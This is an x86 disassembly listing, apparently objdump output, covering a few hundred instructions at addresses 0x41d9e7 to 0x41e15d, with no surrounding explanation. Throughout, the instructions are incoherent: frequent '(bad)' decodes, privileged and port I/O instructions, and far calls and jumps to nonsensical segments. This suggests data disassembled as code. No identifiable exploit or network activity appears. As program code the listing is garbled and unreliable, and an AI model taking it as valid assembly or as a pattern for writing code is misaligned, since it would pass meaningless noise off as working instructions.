  41d9e7:	mov    ?,WORD PTR [edx+0x3f7cdac2]
  41d9ed:	jecxz  0x41da19
  41d9ef:	fsub   DWORD PTR [ebp-0x7339510a]
  41d9f5:	xchg   ebp,eax
  41d9f6:	ins    BYTE PTR es:[edi],dx
  41d9f7:	loopne 0x41d97b
  41d9f9:	xor    al,0x13
  41d9fb:	call   0x3feb:0x72952549
  41da02:	cmp    dl,BYTE PTR [edx+ecx*2+0x24]
  41da06:	xchg   edi,eax
  41da07:	enter  0x7953,0x87
  41da0b:	lods   al,BYTE PTR ds:[esi]
  41da0c:	inc    ecx
  41da0d:	xchg   ebp,eax
  41da0e:	mov    eax,ds:0x3d0eb770
  41da13:	rcr    edx,0x60
  41da16:	adc    al,0x97
  41da18:	fsub   QWORD PTR [edx]
  41da1a:	dec    esi
  41da1b:	adc    ecx,DWORD PTR [edi+0x4fc95c90]
  41da21:	test   al,0xfb
  41da23:	add    DWORD PTR [ecx-0x16],eax
  41da26:	test   al,0xe8
  41da28:	cmp    eax,DWORD PTR [esi+0x19993ff5]
  41da2e:	mov    bl,BYTE PTR [ecx+ecx*4+0x4b]
  41da32:	and    DWORD PTR [edx],eax
  41da34:	adc    BYTE PTR [ebp+ecx*4-0x6f],ah
  41da38:	jae    0x41da50
  41da3a:	stos   BYTE PTR es:[edi],al
  41da3b:	add    bl,ch
  41da3d:	call   0x88fd:0x365f60c9
  41da44:	daa    
  41da45:	int    0xf
  41da47:	sbb    BYTE PTR [esi+0x31],bh
  41da4a:	ins    BYTE PTR es:[edi],dx
  41da4b:	out    0xa,eax
  41da4d:	cmp    esi,DWORD PTR ds:0xa68a2025
  41da53:	mov    al,ds:0x8b85bf9e
  41da58:	pop    esi
  41da59:	pop    ds
  41da5a:	inc    edi
  41da5b:	cli    
  41da5c:	push   ecx
  41da5d:	push   0x67350600
  41da62:	arpl   sp,di
  41da64:	push   0xffffff89
  41da66:	xor    al,ch
  41da68:	add    DWORD PTR [ecx],esi
  41da6a:	aaa    
  41da6b:	dec    ebx
  41da6c:	mov    edx,0xd5d8995a
  41da71:	mov    ds:0x4d01de16,eax
  41da76:	pushf  
  41da77:	pop    ebx
  41da78:	inc    edi
  41da79:	xor    bh,BYTE PTR [ecx+0x7d]
  41da7c:	push   0xffffffe8
  41da7e:	dec    esi
  41da7f:	daa    
  41da80:	ins    DWORD PTR es:[edi],dx
  41da81:	mov    ecx,0x3118199b
  41da86:	ins    BYTE PTR es:[edi],dx
  41da87:	bound  edi,QWORD PTR [edi+ebx*1+0x22abb503]
  41da8e:	sti    
  41da8f:	(bad)
  41da93:	jp     0x41dac6
  41da95:	ja     0x41db13
  41da97:	imul   eax,DWORD PTR [edx-0x15],0xffffffcf
  41da9b:	mov    ebp,ebp
  41da9d:	jecxz  0x41daac
  41da9f:	xor    DWORD PTR [edx+eiz*1+0x6d],ebx
  41daa3:	xor    edx,DWORD PTR [ecx+ebp*1-0x5a]
  41daa7:	or     ebp,eax
  41daa9:	mov    edi,0xa5a53285
  41daae:	add    esi,DWORD PTR [edi]
  41dab0:	ins    DWORD PTR es:[edi],dx
  41dab1:	mov    eax,ds:0xcbbef84d
  41dab6:	ffree  st(6)
  41dab8:	test   DWORD PTR [eax],esp
  41daba:	fisttp QWORD PTR [esi+0x4e]
  41dabd:	jle    0x41dab4
  41dabf:	stos   BYTE PTR es:[edi],al
  41dac0:	(bad)  [ebx+eiz*2-0x65d2fff]
  41dac7:	xor    DWORD PTR [edi],edi
  41dac9:	popa   
  41daca:	xor    al,ch
  41dacc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dacd:	sbb    ch,BYTE PTR [edi-0x46]
  41dad0:	mov    ebx,DWORD PTR gs:[esi+edx*4-0x2474cf82]
  41dad8:	fst    DWORD PTR [ebp-0x55]
  41dadb:	sbb    al,0x8e
  41dadd:	call   FWORD PTR [ebp+0x54952c27]
  41dae3:	cmp    edi,ecx
  41dae5:	xor    bh,BYTE PTR [esp+ebx*8]
  41dae8:	push   esi
  41dae9:	test   ecx,esp
  41daeb:	inc    eax
  41daec:	and    eax,0xa8ae9
  41daf1:	sub    dl,BYTE PTR ds:0x98bbf793
  41daf7:	or     DWORD PTR [edx-0x5],esi
  41dafa:	mov    ds:0x5fc70d6a,al
  41daff:	mov    esi,0x81fcddac
  41db04:	leave  
  41db05:	rcr    BYTE PTR [ebp+ecx*2-0x1de4c243],cl
  41db0c:	push   eax
  41db0d:	cmp    al,ah
  41db0f:	dec    ebp
  41db10:	hlt    
  41db11:	push   es
  41db12:	adc    bh,bl
  41db14:	dec    eax
  41db15:	or     DWORD PTR [ecx],esp
  41db17:	mov    dl,0xa1
  41db19:	imul   eax,DWORD PTR [ebx-0x6ebf10f6],0x90104ed3
  41db23:	out    dx,al
  41db24:	fwait
  41db25:	icebp  
  41db26:	pop    ebx
  41db27:	sub    ebp,DWORD PTR [edx]
  41db29:	inc    ecx
  41db2a:	sub    al,0xf
  41db2c:	cmc    
  41db2d:	xor    BYTE PTR [esi-0x19],0xa
  41db31:	in     eax,0x4a
  41db33:	loopne 0x41db66
  41db35:	sub    dh,dh
  41db37:	pushf  
  41db38:	push   ss
  41db39:	pop    ds
  41db3a:	shl    DWORD PTR [ebp+0x420af3f9],0x7a
  41db41:	push   ebx
  41db42:	xor    BYTE PTR [edx-0x4b671b44],cl
  41db48:	xchg   edi,ecx
  41db4a:	out    dx,al
  41db4b:	aam    0x9f
  41db4d:	(bad)  
  41db4e:	loope  0x41dbbd
  41db50:	adc    al,0xa9
  41db52:	mov    ds:0xdccd7476,eax
  41db57:	cdq    
  41db58:	pop    esp
  41db59:	adc    al,0xca
  41db5b:	and    eax,DWORD PTR [edi+0x220ab44d]
  41db61:	inc    esi
  41db62:	es dec esp
  41db64:	aas    
  41db65:	ss and eax,0x7265b360
  41db6b:	xor    eax,0xa786461f
  41db70:	mov    DWORD PTR [ecx],ebx
  41db72:	mov    fs,WORD PTR [edx+0x24]
  41db75:	push   ecx
  41db76:	xchg   esi,eax
  41db77:	inc    ecx
  41db78:	imul   edx,DWORD PTR [esi+0x1b1f1338],0x39
  41db7f:	xor    BYTE PTR [eax-0x63],cl
  41db82:	cmp    BYTE PTR [eax-0x4b],0x6b
  41db86:	pop    ebp
  41db87:	mov    edx,0xd90d52fb
  41db8c:	pop    ss
  41db8d:	mov    ah,0xfe
  41db8f:	jp     0x41db23
  41db91:	sbb    al,0xff
  41db93:	stc    
  41db94:	xchg   esi,eax
  41db95:	xchg   ecx,eax
  41db96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db97:	stos   BYTE PTR es:[edi],al
  41db98:	add    al,0x88
  41db9a:	add    BYTE PTR [edx-0x66],0x79
  41db9e:	mov    bh,0x9f
  41dba0:	in     eax,0x4f
  41dba2:	jmp    0x80fd:0xabb5ca1b
  41dba9:	or     BYTE PTR [ebx+0x35b2085c],bh
  41dbaf:	es es in eax,0x69
  41dbb3:	or     al,0x60
  41dbb5:	xchg   ecx,eax
  41dbb6:	cs xchg esi,eax
  41dbb8:	mov    ch,0xba
  41dbba:	jecxz  0x41dbbf
  41dbbc:	ret    0xe209
  41dbbf:	scas   eax,DWORD PTR es:[edi]
  41dbc0:	vpmacsswd xmm6,xmm2,xmm2,xmm1
  41dbc6:	and    al,0xae
  41dbc8:	sub    BYTE PTR [edx+eiz*8+0x1e11710],ch
  41dbcf:	dec    edx
  41dbd0:	cld    
  41dbd1:	lahf   
  41dbd2:	leave  
  41dbd3:	pushf  
  41dbd4:	add    DWORD PTR [eax+0x5e62c9a0],edi
  41dbda:	inc    edx
  41dbdb:	imul   ebx,DWORD PTR [ebx+ecx*4+0x76d9da37],0x94adc72e
  41dbe6:	sbb    BYTE PTR [ecx+ecx*1-0x39c25c85],cl
  41dbed:	jnp    0x41dc2a
  41dbef:	push   edi
  41dbf0:	mov    ch,0xd3
  41dbf2:	sbb    esp,ecx
  41dbf4:	mov    bl,0x5e
  41dbf6:	or     BYTE PTR [esi],cl
  41dbf8:	pop    esp
  41dbf9:	pop    esi
  41dbfa:	xor    DWORD PTR [edi+0x577b433f],ebx
  41dc00:	cmp    bh,al
  41dc02:	fsubp  st(2),st
  41dc04:	cmp    cl,ah
  41dc06:	mov    esp,0xf45e9962
  41dc0b:	push   0xefb8f9e3
  41dc10:	shr    DWORD PTR [esi],cl
  41dc12:	(bad)  
  41dc13:	fiadd  DWORD PTR [ebx+0x7e]
  41dc16:	inc    edx
  41dc17:	fucomip st,st(3)
  41dc19:	mov    ds:0x61616c8c,eax
  41dc1e:	dec    eax
  41dc1f:	out    0xe6,al
  41dc21:	push   ecx
  41dc22:	xlat   BYTE PTR ds:[ebx]
  41dc23:	cs mov bh,0x80
  41dc26:	pop    ebp
  41dc27:	stos   DWORD PTR es:[edi],eax
  41dc28:	and    al,0x9c
  41dc2a:	sub    al,0x8f
  41dc2c:	push   ss
  41dc2d:	cmp    ch,BYTE PTR [ebx-0x73fcabc1]
  41dc33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc34:	inc    ecx
  41dc35:	pop    ebp
  41dc36:	lods   al,BYTE PTR ds:[esi]
  41dc37:	mov    edi,0x5e12b47d
  41dc3c:	jbe    0x41dc7c
  41dc3e:	adc    ecx,DWORD PTR ds:0x318f1b0d
  41dc44:	inc    DWORD PTR [ecx+0x759dddff]
  41dc4a:	sub    al,0xd5
  41dc4c:	scas   al,BYTE PTR es:[edi]
  41dc4d:	mov    ecx,0xaea85721
  41dc52:	test   BYTE PTR [edx],bl
  41dc54:	cmp    bl,BYTE PTR ds:0xb9b3d640
  41dc5a:	or     DWORD PTR [ebx],0xffffffdf
  41dc5d:	push   0xe1ce5010
  41dc62:	enter  0x7998,0xaa
  41dc66:	mov    al,0xa8
  41dc68:	sub    BYTE PTR [ecx],0xe5
  41dc6b:	test   al,0xb9
  41dc6d:	xor    edi,edx
  41dc6f:	iret   
  41dc70:	cmp    BYTE PTR [ecx-0x4b],ch
  41dc73:	pop    edi
  41dc74:	ds sahf 
  41dc76:	in     eax,dx
  41dc77:	scas   al,BYTE PTR es:[edi]
  41dc78:	mov    edx,0x88ee234e
  41dc7d:	sub    ah,BYTE PTR [esi-0x6a4a6d6]
  41dc83:	fnstsw WORD PTR [esi+0xb]
  41dc86:	xchg   edi,eax
  41dc87:	mov    cs,edi
  41dc89:	add    al,0xd7
  41dc8b:	jle    0x41dce7
  41dc8d:	jo     0x41dc59
  41dc8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc90:	test   al,0x3d
  41dc92:	push   ecx
  41dc93:	xor    DWORD PTR [edi],esi
  41dc95:	dec    ecx
  41dc96:	outs   dx,BYTE PTR ds:[esi]
  41dc97:	xor    DWORD PTR [eax-0x22],edx
  41dc9a:	pop    es
  41dc9b:	dec    edi
  41dc9c:	pusha  
  41dc9d:	dec    eax
  41dc9e:	jnp    0x41dc2e
  41dca0:	(bad)  [esi+0x31]
  41dca3:	in     al,0xe1
  41dca5:	add    ebp,0x55fba320
  41dcab:	cwde   
  41dcac:	retf   
  41dcad:	add    al,0x29
  41dcaf:	cmc    
  41dcb0:	pop    ebx
  41dcb1:	inc    edx
  41dcb2:	adc    ah,bh
  41dcb4:	adc    edi,DWORD PTR [ebp+0x67]
  41dcb7:	jmp    0x6505:0x71c440f2
  41dcbe:	fnsave [eax]
  41dcc0:	add    al,bl
  41dcc2:	aas    
  41dcc3:	enter  0x5c2e,0x9c
  41dcc7:	mov    ebx,0xbe89651b
  41dccc:	mov    ds:0x863248a4,al
  41dcd1:	add    al,0x8e
  41dcd3:	sbb    eax,0x33d4d2ae
  41dcd8:	loope  0x41dd4e
  41dcda:	or     al,0x6f
  41dcdc:	inc    ebx
  41dcdd:	cli    
  41dcde:	and    dl,BYTE PTR [ebx-0x27b95360]
  41dce4:	lea    ebp,[edi-0x7d]
  41dce7:	ret    
  41dce8:	enter  0x92e4,0xb0
  41dcec:	sbb    eax,0xc6b3105b
  41dcf1:	mov    dl,0x89
  41dcf3:	sti    
  41dcf4:	push   ss
  41dcf5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dcf6:	ja     0x41dd09
  41dcf8:	call   0xfa79:0x9b3ac27c
  41dcff:	xor    esp,eax
  41dd01:	rcl    ah,cl
  41dd03:	out    0xfe,eax
  41dd05:	and    eax,0xd485ff0b
  41dd0a:	sub    ah,ch
  41dd0c:	sub    BYTE PTR [eax+0x26bc8a24],0xcd
  41dd13:	mov    ebp,ebp
  41dd15:	mov    eax,ds:0xeddb1b46
  41dd1a:	rcr    BYTE PTR [ecx-0x68],1
  41dd1d:	mov    ds:0x8aec4848,eax
  41dd22:	shl    DWORD PTR [ebp-0x22],0xae
  41dd26:	fadd   DWORD PTR [edx]
  41dd28:	mov    edx,0x36b5f7db
  41dd2d:	sti    
  41dd2e:	dec    edi
  41dd2f:	in     eax,0x83
  41dd31:	mov    edx,0xfe784ecb
  41dd37:	sahf   
  41dd38:	dec    ebp
  41dd39:	xor    bl,BYTE PTR [esi+esi*8-0x232a0d2f]
  41dd40:	cmp    eax,0x2db771bb
  41dd45:	(bad)  
  41dd46:	sbb    edx,esp
  41dd48:	ja     0x41dcf6
  41dd4a:	cmc    
  41dd4b:	ja     0x41dda6
  41dd4d:	pop    eax
  41dd4e:	mov    ds:0xd3c714f6,al
  41dd53:	xor    edi,edx
  41dd55:	push   ss
  41dd56:	mov    BYTE PTR [edi+0x4a],0x4e
  41dd5a:	(bad)  [ebx+0x38]
  41dd5d:	mov    ?,WORD PTR es:[ebx]
  41dd60:	jg     0x41ddb3
  41dd62:	ins    BYTE PTR es:[edi],dx
  41dd63:	mov    ebp,0x31397c7f
  41dd68:	mov    ebp,0x79ac76c9
  41dd6d:	cld    
  41dd6e:	shr    dl,0x54
  41dd71:	pop    es
  41dd72:	data16 lock std 
  41dd75:	inc    ebx
  41dd76:	and    ch,BYTE PTR [esi+0xb]
  41dd79:	jg     0x41ddc7
  41dd7b:	xchg   BYTE PTR [edx-0x73761cc2],bh
  41dd81:	popf   
  41dd82:	cmp    eax,0xda82f029
  41dd87:	push   0x806d1258
  41dd8c:	rol    ecx,0x12
  41dd8f:	xor    DWORD PTR [eax+0x1b1d1ac9],esp
  41dd95:	cwde   
  41dd96:	scas   al,BYTE PTR es:[edi]
  41dd97:	jge    0x41dd8a
  41dd99:	mov    ah,0xf2
  41dd9b:	fwait
  41dd9c:	pop    ebx
  41dd9d:	inc    esi
  41dd9e:	hlt    
  41dd9f:	mov    esi,0xa0b2b0af
  41dda4:	xchg   ebp,eax
  41dda5:	hlt    
  41dda6:	add    eax,0x27a3b51a
  41ddab:	mov    al,ds:0xc4a511ae
  41ddb0:	sub    edi,DWORD PTR [ebp+ecx*1+0x43]
  41ddb4:	fist   WORD PTR [esi]
  41ddb6:	xchg   ebp,eax
  41ddb7:	rcr    edx,1
  41ddb9:	daa    
  41ddba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ddbb:	jecxz  0x41ddbb
  41ddbd:	clc    
  41ddbe:	xchg   BYTE PTR ds:[edi],dl
  41ddc1:	popa   
  41ddc2:	(bad)  
  41ddc3:	add    al,0xe2
  41ddc5:	frstor [eax]
  41ddc7:	sbb    eax,0x37f1a4b0
  41ddcc:	(bad)
  41ddd0:	les    esp,FWORD PTR [ecx+0x15]
  41ddd3:	scas   al,BYTE PTR es:[edi]
  41ddd4:	repnz fstp QWORD PTR [edx+0xf0c9734]
  41dddb:	mov    BYTE PTR [eax+0x1f],dh
  41ddde:	jne    0x41de1e
  41dde0:	inc    eax
  41dde1:	(bad)  
  41dde2:	push   ss
  41dde3:	imul   ebx,DWORD PTR [esi-0x3a],0x7e
  41dde7:	test   esp,0xcaf33c31
  41dded:	fdivr  DWORD PTR [eax-0x69]
  41ddf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ddf1:	icebp  
  41ddf2:	mov    al,0x80
  41ddf4:	rol    BYTE PTR [esi],1
  41ddf6:	dec    esi
  41ddf7:	jmp    0x7e3:0xd77b2d34
  41ddfe:	cld    
  41ddff:	inc    edx
  41de00:	xor    DWORD PTR [ebx],esp
  41de02:	mov    eax,DWORD PTR [ebp-0x34]
  41de05:	arpl   si,si
  41de07:	inc    esi
  41de08:	or     ch,BYTE PTR es:[esi]
  41de0b:	fnop   
  41de0d:	sbb    eax,0xd87ba1eb
  41de12:	and    al,0x25
  41de14:	and    eax,0xa801d73a
  41de19:	aaa    
  41de1a:	add    al,0xba
  41de1c:	retf   0xd861
  41de1f:	(bad)  
  41de20:	mov    gs,esi
  41de22:	scas   al,BYTE PTR es:[edi]
  41de23:	je     0x41de49
  41de25:	mov    bh,0x89
  41de27:	loope  0x41de35
  41de29:	or     dh,cl
  41de2b:	outs   dx,DWORD PTR ds:[esi]
  41de2c:	shl    DWORD PTR [edi],0x63
  41de2f:	sar    BYTE PTR [ebx+0x7cc31c64],cl
  41de35:	xor    BYTE PTR [eax-0x26],bl
  41de38:	inc    esi
  41de39:	or     esi,DWORD PTR [ecx*8+0xa812ccd]
  41de40:	or     BYTE PTR [edx],bl
  41de42:	loopne 0x41de50
  41de44:	add    al,0x18
  41de46:	sbb    ah,BYTE PTR [ebp+0x31]
  41de49:	fist   DWORD PTR [edx-0x124f6856]
  41de4f:	clc    
  41de50:	sub    dl,0x2f
  41de53:	into   
  41de54:	hlt    
  41de55:	xor    dl,al
  41de57:	ja     0x41de72
  41de59:	fwait
  41de5a:	lods   al,BYTE PTR ds:[esi]
  41de5b:	xor    edx,ebp
  41de5d:	cmp    cl,BYTE PTR [esi-0xe2dc34]
  41de63:	test   BYTE PTR ds:0x24e53e27,bl
  41de69:	dec    ebx
  41de6a:	mov    db6,ebx
  41de6d:	jle    0x41dec0
  41de6f:	jl     0x41ddff
  41de71:	nop
  41de72:	xchg   ebp,eax
  41de73:	ret    
  41de74:	mov    edi,esi
  41de76:	clc    
  41de77:	scas   eax,DWORD PTR es:[edi]
  41de78:	xchg   BYTE PTR [esi+eax*1+0x50],cl
  41de7c:	scas   al,BYTE PTR es:[edi]
  41de7d:	dec    eax
  41de7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de7f:	cmp    BYTE PTR [edx-0x597d4dd],bl
  41de85:	les    eax,FWORD PTR [edi]
  41de87:	mov    ah,0x4b
  41de89:	in     al,0x58
  41de8b:	int    0xdf
  41de8d:	mov    esp,0x350ed30a
  41de92:	loopne 0x41de99
  41de94:	cmp    DWORD PTR [esi+0x51],ebx
  41de97:	cmp    esi,DWORD PTR [ebx-0x3bf7b8ec]
  41de9d:	cwde   
  41de9e:	xchg   DWORD PTR [edi],edx
  41dea0:	lods   eax,DWORD PTR ds:[esi]
  41dea1:	retf   0xb925
  41dea4:	xchg   DWORD PTR [edi-0x14a1a9d4],edx
  41deaa:	pop    eax
  41deab:	jge    0x41dee1
  41dead:	bound  edx,QWORD PTR [edi+0x78]
  41deb0:	sbb    eax,0xfd051f0a
  41deb5:	add    DWORD PTR [eax-0x73],0xffffffad
  41deb9:	pop    es
  41deba:	in     eax,dx
  41debb:	cli    
  41debc:	stos   DWORD PTR es:[edi],eax
  41debd:	loop   0x41df0f
  41debf:	mov    bh,0xfc
  41dec1:	stos   DWORD PTR es:[edi],eax
  41dec2:	lea    edi,[edx]
  41dec4:	out    0x1b,al
  41dec6:	mov    cl,0x60
  41dec8:	aaa    
  41dec9:	pushf  
  41deca:	sbb    DWORD PTR [edx+0x1e9c6050],edi
  41ded0:	cld    
  41ded1:	jb     0x41df48
  41ded3:	fnstsw WORD PTR [edi+0x3b]
  41ded6:	leave  
  41ded7:	push   ds
  41ded8:	xchg   DWORD PTR [edi+0x133ffddd],edx
  41dede:	jmp    0x41df15
  41dee0:	push   esi
  41dee1:	xchg   esi,eax
  41dee2:	lock push edi
  41dee4:	stc    
  41dee5:	mov    bh,0xed
  41dee7:	retf   0x8c34
  41deea:	popf   
  41deeb:	das    
  41deec:	stos   DWORD PTR es:[edi],eax
  41deed:	sub    ebx,edx
  41deef:	iret   
  41def0:	jo     0x41de82
  41def2:	sub    eax,0x6fc21cdc
  41def7:	cmp    eax,0xbe7d0c90
  41defc:	out    dx,eax
  41defd:	mov    bl,0xab
  41deff:	add    bh,dl
  41df01:	mov    ebp,0xd281cceb
  41df06:	mov    edi,0x389ed4fd
  41df0b:	cmp    bl,BYTE PTR [eax]
  41df0d:	out    0x2b,eax
  41df0f:	add    ebx,ebp
  41df11:	sbb    BYTE PTR [esp+ebx*2-0x2fa2e1b3],dh
  41df18:	jmp    0x86f7:0xe928ace5
  41df1f:	cli    
  41df20:	inc    ebx
  41df21:	cs cmp al,0x7d
  41df24:	mov    al,ds:0x788b3cd3
  41df29:	or     esp,edi
  41df2b:	fidivr DWORD PTR [eax+0x4b]
  41df2e:	shl    DWORD PTR [esi],1
  41df30:	dec    eax
  41df31:	cmp    al,0x46
  41df33:	mov    al,ds:0x68e2fb0d
  41df38:	ss push ss
  41df3a:	pop    ebp
  41df3b:	dec    esi
  41df3c:	jbe    0x41df90
  41df3e:	xor    esp,edi
  41df40:	push   ebx
  41df41:	pop    DWORD PTR [edx-0x59b23a60]
  41df47:	mov    ebp,0x538a6dcb
  41df4c:	das    
  41df4d:	fistp  DWORD PTR [edi]
  41df4f:	sbb    cl,dl
  41df51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df52:	pinsrw mm0,WORD PTR [edx],0xe9
  41df56:	fwait
  41df57:	push   edi
  41df58:	pushf  
  41df59:	jge    0x41df22
  41df5b:	cmp    dh,bl
  41df5d:	adc    BYTE PTR [esi],0xe
  41df60:	mov    ebp,0x9f3490e0
  41df65:	xor    eax,0xb7388dd5
  41df6a:	mov    es,WORD PTR [esi+0xde2ec28]
  41df70:	cmp    BYTE PTR [edx],ch
  41df72:	shr    BYTE PTR [edi+ecx*1-0x60f479c6],1
  41df79:	inc    edi
  41df7a:	pop    ebp
  41df7b:	inc    ecx
  41df7c:	shl    cl,cl
  41df7e:	enter  0xbca8,0x8c
  41df82:	pmulhw mm7,QWORD PTR [eax]
  41df85:	and    DWORD PTR [ebp-0x7c],edx
  41df88:	cs ret 0x7390
  41df8c:	scas   al,BYTE PTR es:[edi]
  41df8d:	inc    ebx
  41df8e:	mov    esp,DWORD PTR [eax+0x6f1511bd]
  41df94:	xor    eax,0xccffc006
  41df99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df9a:	int    0x87
  41df9c:	jae    0x41dfe3
  41df9e:	stos   BYTE PTR es:[edi],al
  41df9f:	loope  0x41dfef
  41dfa1:	scas   al,BYTE PTR es:[edi]
  41dfa2:	mov    DWORD PTR [esi+0x60fac2e6],esi
  41dfa8:	add    al,0x61
  41dfaa:	leave  
  41dfab:	pop    ds
  41dfac:	int    0xf9
  41dfae:	clc    
  41dfaf:	sbb    BYTE PTR [edi-0x3021240a],bh
  41dfb5:	push   ds
  41dfb6:	push   ebp
  41dfb7:	in     al,0xdc
  41dfb9:	stc    
  41dfba:	out    dx,al
  41dfbb:	clc    
  41dfbc:	aas    
  41dfbd:	cmc    
  41dfbe:	pushf  
  41dfbf:	jmp    0x4c3b:0xba0a4f0
  41dfc6:	std    
  41dfc7:	lock push esp
  41dfc9:	cmp    bh,cl
  41dfcb:	sbb    DWORD PTR [ebp+0x67],ecx
  41dfce:	jmp    0x41dfdd
  41dfd0:	sbb    esi,DWORD PTR [edi+eiz*8-0x49ab777e]
  41dfd7:	pop    ebx
  41dfd8:	enter  0x7538,0x11
  41dfdc:	ror    BYTE PTR ds:0xf71a10bf,cl
  41dfe2:	popf   
  41dfe3:	cwde   
  41dfe4:	repnz lods eax,DWORD PTR gs:[esi]
  41dfe7:	test   BYTE PTR [esi],0xcf
  41dfea:	fadd   DWORD PTR [edx]
  41dfec:	call   0xb7a19c8f
  41dff1:	hlt    
  41dff2:	ja     0x41dfca
  41dff4:	int3   
  41dff5:	mov    edx,0x193fd6f6
  41dffa:	jmp    0x37209b15
  41dfff:	retf   0xc8d2
  41e002:	arpl   WORD PTR [edi-0x1642c113],si
  41e008:	outs   dx,DWORD PTR ds:[esi]
  41e009:	rol    eax,0xdc
  41e00c:	push   ebp
  41e00d:	add    DWORD PTR [esi],esi
  41e00f:	jl     0x41dff0
  41e011:	cs retf 
  41e013:	cli    
  41e014:	fidiv  DWORD PTR [ebx]
  41e016:	stc    
  41e017:	pop    esi
  41e018:	inc    edx
  41e019:	out    dx,eax
  41e01a:	cmp    BYTE PTR [edx],0xf7
  41e01d:	mov    ds:0x8993b108,eax
  41e022:	inc    ebx
  41e023:	or     eax,0x6d2fa3fa
  41e028:	js     0x41dfb9
  41e02a:	mov    eax,0xfba98346
  41e02f:	(bad)  
  41e031:	idiv   DWORD PTR [eax+0x66bd0aa2]
  41e037:	mov    esp,0xb487797e
  41e03c:	mov    ecx,0x6d1c0660
  41e041:	inc    esi
  41e042:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e043:	xchg   BYTE PTR [esp+ecx*1],ah
  41e046:	cwde   
  41e047:	push   esi
  41e048:	dec    esp
  41e049:	mov    eax,ds:0xaf22b539
  41e04e:	(bad)  
  41e04f:	dec    esi
  41e050:	(bad)  
  41e051:	jge    0x41dfd9
  41e053:	stc    
  41e054:	or     al,0x1a
  41e056:	in     al,dx
  41e057:	loope  0x41e076
  41e059:	or     ch,BYTE PTR [edi+0x4821dd41]
  41e05f:	je     0x41dfe8
  41e061:	ja     0x41e003
  41e063:	mov    ss,WORD PTR [ecx+eax*8+0x2f]
  41e067:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e068:	xchg   edi,eax
  41e069:	(bad)
  41e06c:	retf   0xd315
  41e06f:	dec    ebx
  41e070:	mov    bh,0xb6
  41e072:	aaa    
  41e073:	jo     0x41dff9
  41e075:	pop    esi
  41e076:	and    BYTE PTR [ecx+0x22f761c1],dl
  41e07c:	mov    dl,0x3e
  41e07e:	push   edi
  41e07f:	inc    ebx
  41e080:	ins    DWORD PTR es:[edi],dx
  41e081:	mov    ch,0xb5
  41e083:	ins    DWORD PTR es:[edi],dx
  41e084:	fild   WORD PTR [ebp-0xb]
  41e087:	jle    0xe5b16a1c
  41e08d:	retf   
  41e08e:	xor    al,0x69
  41e090:	test   DWORD PTR [ebp-0x57],ebp
  41e093:	add    al,0x6e
  41e095:	or     cl,BYTE PTR [ebx-0x46]
  41e098:	push   0x27
  41e09a:	shl    BYTE PTR [eax-0x43],0xfc
  41e09e:	popa   
  41e09f:	jg     0x41e0b8
  41e0a1:	in     al,0xce
  41e0a3:	xchg   esi,eax
  41e0a4:	clc    
  41e0a5:	mov    ebp,0xde3a6734
  41e0aa:	mov    eax,ds:0x236a7db8
  41e0af:	xchg   edi,eax
  41e0b0:	gs jo  0x41e10f
  41e0b3:	sub    BYTE PTR [esi+0xa2d1db7],cl
  41e0b9:	repnz mov esp,0xbd94d65e
  41e0bf:	jnp    0x41e065
  41e0c1:	loope  0x41e073
  41e0c3:	daa    
  41e0c4:	lods   al,BYTE PTR ds:[esi]
  41e0c5:	sub    eax,0xbe1080ef
  41e0ca:	push   ecx
  41e0cb:	inc    DWORD PTR [esi+0x18]
  41e0ce:	adc    bh,ah
  41e0d0:	sub    al,0x7a
  41e0d2:	jge    0x41e05f
  41e0d4:	rcr    ch,cl
  41e0d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e0d7:	jmp    0xd59a745
  41e0dc:	out    0xf8,eax
  41e0de:	rol    cl,1
  41e0e0:	mov    bl,0x49
  41e0e2:	jecxz  0x41e105
  41e0e4:	mov    ds:0x27ed97bb,eax
  41e0e9:	scas   al,BYTE PTR es:[edi]
  41e0ea:	inc    esi
  41e0eb:	mov    ah,0xb8
  41e0ed:	hlt    
  41e0ee:	cdq    
  41e0ef:	push   esi
  41e0f0:	lock (bad) 
  41e0f3:	int    0x5
  41e0f5:	mov    al,0xe8
  41e0f7:	pop    ss
  41e0f8:	jecxz  0x41e0de
  41e0fa:	cmc    
  41e0fb:	js     0x41e148
  41e0fd:	mov    edx,0x9c7aaba7
  41e102:	popf   
  41e103:	xchg   edx,eax
  41e104:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e105:	in     eax,dx
  41e106:	xor    BYTE PTR [ecx],ch
  41e108:	test   eax,0x6b054ba8
  41e10d:	lahf   
  41e10e:	mov    eax,DWORD PTR [edi+0x6e3e2a43]
  41e114:	sti    
  41e115:	mov    edi,esi
  41e117:	jle    0x41e0e6
  41e119:	pop    edi
  41e11a:	xchg   esi,eax
  41e11b:	fsub   st(6),st
  41e11d:	imul   ebp,DWORD PTR [edx-0x68],0xa324154f
  41e124:	cmp    al,0x79
  41e126:	xchg   esi,eax
  41e127:	and    ch,BYTE PTR [edi+edx*4-0x69]
  41e12b:	clc    
  41e12c:	inc    esi
  41e12d:	xor    esp,DWORD PTR [ecx-0x17]
  41e130:	and    eax,0x7a2a6987
  41e135:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e136:	xor    al,0x76
  41e138:	add    eax,0x926b4ce6
  41e13d:	adc    ah,cl
  41e13f:	mov    esi,0x9258afba
  41e144:	jecxz  0x41e151
  41e146:	daa    
  41e147:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e148:	addr16 int3 
  41e14a:	add    eax,0x1cafaf5d
  41e14f:	bound  eax,QWORD PTR [ecx-0x75f1476a]
  41e155:	(bad)  
  41e156:	rcr    ah,1
  41e158:	fdiv   st(6),st
  41e15a:	in     eax,dx
  41e15b:	je     0x41e132
  41e15d:	sbb    DWORD PTR [edi-0x43],ebx
